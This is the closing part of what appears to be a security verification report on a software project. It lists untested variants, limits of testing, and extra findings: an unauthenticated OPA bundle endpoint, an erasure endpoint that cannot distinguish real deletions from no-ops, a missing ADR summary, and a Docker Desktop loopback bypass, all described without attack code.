- **V7:** did not attempt a `docker` binary on `PATH` that is a *working but wrong* Docker install (e.g., pointed at an unrelated daemon) — the brief's three named sub-attacks (daemon stopped, stack down, non-Docker binary) were the ones tested; a working-but-wrong daemon is a variant of sub-attack 1's own class (unreachable target) and was judged to add no new information.
- **V8:** did not attempt a deployed-Worker or non-Windows-host reproduction of the parity harness — the original spike and Phase 1.2's own re-verification both already disclosed this as untested; not re-litigated here since P13-6's own scope is explicitly "reproducible from one commit," not "reproducible on every platform."

---

## 5. Could not test

- **A genuine second physical machine for V2's off-host reachability check.** Simulated via the same substitution the project's own prior red-team sessions used (a LAN-facing address on the same host) for the LAN-reachability half; the `host.docker.internal` and isolated-container findings did not require a second machine at all — they demonstrate a different, container-local bypass path.
- **A user-accessible WSL2 distribution**, named explicitly in V2's brief as a vantage point to test. `wsl.exe -l -v` on this machine lists only `docker-desktop` (Docker Desktop's own internal backend VM, not a general-purpose user distro) — there is no Ubuntu/Debian/etc. distro installed to independently test Windows' `localhostForwarding` behavior from a genuine WSL2 shell as a vantage point distinct from a Docker container. The container-based tests in §3 (V2) already exercise a network position with a comparable relationship to the host's loopback interface (Docker Desktop's own backend is itself WSL2-based on this machine), so the practical exposure is very likely the same mechanism, but this was not independently confirmed from an actual WSL prompt.
- **Whether the `content_store_unreachable` fault class (the other of the two fault classes ADR-0005 says can never produce a ledger record) could somehow still reach the dashboard's `FaultClass` type gap found in V1.** By construction (per the ADR's own Documented Boundary section, confirmed by reading `interceptor/middleware.py`'s `intercept_tool_call`) it cannot — the fault path for `content_store_unreachable` returns before any ledger write is attempted. Confirmed by reading, not by a forced live reproduction (would require sabotaging the content-store write path, already covered by the existing `test_content_store_down_denies_as_fault_and_writes_no_record`, which passed in the baseline).

---

## 6. Findings outside V1–V8

1. **The `DELETE /content/{call_id}` endpoint's response does not distinguish a real erasure from a no-op.** All three cases — a genuine erasure, an attempt against an already-`unavailable` call, and an attempt against a `call_id` that never existed — return an identical `204 No Content`. Not a wrong `payload_state` (V4's own concern, and it correctly HOLDS), but a caller cannot tell from the response alone whether an Article-17 erasure actually happened. Live-confirmed in §3 (V4), combinations D and F.

2. **README §6 has no summary bullet for ADR-0007** (Two-Tier Authorization), despite ADR-0007 governing the exact authorization model P13-3 and P13-4 both extend this phase. §6 lists ADR-001 through ADR-006 only. Not a false claim (nothing wrong is stated), so not folded into V1's REFUTED verdict, but a gap in the same "every ADR gets a summary" pattern the other six follow.

3. **`GET /bundles/{tenant_id}` (V6's finding) is very likely intentional, not an oversight** — OPA's own Bundle API client, as configured in `opa-config.yaml`, sends no credential of any kind on its polling requests, so an authenticated bundle endpoint would break OPA's own ability to fetch it. This is reported as a finding regardless: the claim under test (V6) is about whether the exposure exists, not about whether it was deliberate, and the brief explicitly names the bundle endpoint as a route to check.

4. **The `host.docker.internal` bypass (V2/V3) is a Docker Desktop platform behavior, not a code defect in this project** — worth stating precisely since it means the fix surface, if any, is different in kind from P13-1/P13-2's own loopback-binding fix (which is fully effective against the LAN/off-host threat model it targeted). It does not change that the Residual Limits section's own account of *where* these already-disclosed attacks reach from is narrower than reality.

---

*Report complete. All scratch infrastructure torn down and confirmed removed; primary working directory unchanged (`git status --short` empty, `HEAD` at `0cf0f92`, branch `phase-1-1-remediation`).*
